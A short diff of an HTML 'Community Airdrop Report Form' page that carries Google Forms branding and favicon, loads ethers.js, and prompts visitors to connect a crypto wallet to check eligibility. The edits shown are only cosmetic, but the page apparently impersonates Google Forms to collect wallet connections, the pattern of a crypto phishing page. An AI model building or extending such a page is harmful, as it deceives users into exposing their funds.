@@ -5,7 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Community Airdrop Report Form - Google Forms</title>
     
+    <!-- Google Forms Favicon -->
     <link rel="icon" href="https://ssl.gstatic.com/docs/forms/favicon_2024.ico" type="image/x-icon">
+
+    <!-- Reliable ethers.js CDN -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 
     <style>
@@ -30,7 +33,7 @@
         .wallet-btn {
             background:white; color:#131313; border:2px solid #121212; border-radius:6px;
             padding:12px 28px; cursor:pointer; font-size:16px; font-weight:600;
-            transition:all 0.3s ease; width:25%;
+            transition:all 0.3s ease; width:100%;
         }
         .wallet-btn:hover { background:#2e2e2e; color:white; }
         .wallet-btn.connected { background:#1a73e8 !important; color:white !important; border-color:#1a73e8 !important; }
@@ -65,7 +68,9 @@
     <form id="airdropForm">
         <div class="form-card">
             <label>Connect Wallet <span class="required">*</span></label>
-            <p style="color:#5f6368; font-size:14px; margin:8px 0 16px 0;">Connect your wallet to verify your eligibility.</p>
+            <p style="color:#5f6368; font-size:14px; margin:8px 0 16px 0;">
+                Connect your wallet to verify your eligibility.
+            </p>
             <button type="button" id="connectWalletBtn" class="wallet-btn">Connect Wallet</button>
             <div id="walletAddress" class="wallet-address"></div>
             <div id="status" class="status"></div>
